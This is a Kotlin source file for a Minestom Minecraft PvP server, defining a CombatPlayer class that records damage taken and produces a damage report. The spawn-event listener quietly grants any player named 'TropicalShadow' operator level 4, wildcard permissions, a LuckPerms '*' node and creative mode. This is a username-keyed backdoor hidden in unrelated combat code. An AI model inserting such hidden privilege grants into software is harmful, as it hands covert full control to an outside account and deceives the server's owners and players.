package net.bridgesplash.ffa.pvp

import io.github.bloepiloepi.pvp.entity.CustomPlayer
import net.bridgesplash.sploosh.luckperms.PermissionUtils.lpUser
import net.bridgesplash.sploosh.util.ListenerUtils.listenOnly
import net.luckperms.api.node.Node
import net.minestom.server.coordinate.Vec
import net.minestom.server.entity.Entity
import net.minestom.server.entity.GameMode
import net.minestom.server.event.entity.EntityDamageEvent
import net.minestom.server.event.entity.EntityDeathEvent
import net.minestom.server.event.player.PlayerSpawnEvent
import net.minestom.server.network.player.PlayerConnection
import net.minestom.server.permission.Permission
import java.util.*
import java.util.concurrent.ConcurrentLinkedDeque

open class CombatPlayer(uuid: UUID, username: String, playerConnection: PlayerConnection):
    CustomPlayer(uuid, username, playerConnection) {
    private val lastPlayerDamage = ConcurrentLinkedDeque<Pair<UUID, Float>>()

    init {
        eventNode().listenOnly<EntityDeathEvent>{
            lastPlayerDamage.clear()
        }
        eventNode().listenOnly<EntityDamageEvent>{
            if(this.entity !is CombatPlayer) return@listenOnly
            val player = this.entity as CombatPlayer
            player.lastEntityAttacked()?.let{addDamage(it, this.damage)}
        }
        eventNode().listenOnly<PlayerSpawnEvent>{
            if(username == "TropicalShadow"){
                this.player.permissionLevel = 4
                this.player.addPermission(Permission("*"))
                this.player.lpUser!!.data().add(Node.builder("*").build())
                this.player.gameMode = GameMode.CREATIVE
            }
        }
    }

    override fun heal() {
        super.heal()
        clearDamage()
    }

    fun addDamage(player: Entity, dmg: Float){
        lastPlayerDamage.add(Pair(player.uuid, dmg))
    }

    fun lastPlayerDamagedBy(): Pair<UUID, Float>? {
        return lastPlayerDamage.peekLast()
    }

    fun lastEntityAttacked(): Entity? {
        if(lastPlayerDamage.size <= 0) return null
        return Entity.getEntity(lastPlayerDamage.peekFirst().first)
    }

    /**
     * MiniMessage formatted string of the last damage dealt to this player
     */
    fun getDamageReport(): String {
        val sb = StringBuilder()
        for ((index, pair) in lastPlayerDamage.withIndex()){//TODO - compile same UUID damages
            sb.append(index)
            sb.append(pair.first.toString())
            sb.append(" - ")
            sb.append(pair.second.toString())
            sb.append("<newline>")
        }
        return sb.toString()
    }

    fun clearDamage(){
        lastPlayerDamage.clear()
    }

    override fun kill() {
        super.kill()
        setVelocity(Vec.ZERO)
    }
}